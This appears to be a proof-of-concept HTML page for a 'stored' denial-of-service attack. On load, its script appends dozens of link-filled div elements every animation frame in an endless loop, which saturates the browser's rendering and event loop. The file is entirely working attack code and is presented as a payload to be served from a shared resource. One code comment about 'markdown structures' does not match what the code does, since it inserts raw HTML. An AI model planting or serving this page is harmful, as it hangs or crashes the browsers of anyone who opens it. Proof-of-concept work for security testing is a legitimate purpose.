<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC: Automated Stored DoS</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; }
        #render-target { height: 100vh; overflow: hidden; }
    </style>
</head>
<body>
    <div id="render-target"></div>

    <script>
        // Automatic execution upon load (simulating a shared resource load)
        const target = document.getElementById('render-target');
        let counter = 0;

        function injectPayload() {
            for (let i = 0; i < 50; i++) { // Increase density per frame
                const node = document.createElement('div');
                // Creating complex markdown structures to maximize parsing load
                node.innerHTML = `[System_Token_${counter++}](https://google.com/search?q=${Math.random()})`;
                target.appendChild(node);
            }
            
            // Unbounded recursive loop to saturate the event loop
            requestAnimationFrame(injectPayload);
        }

        // Trigger immediately without waiting for user action
        window.onload = injectPayload;
    </script>
</body>
</html>
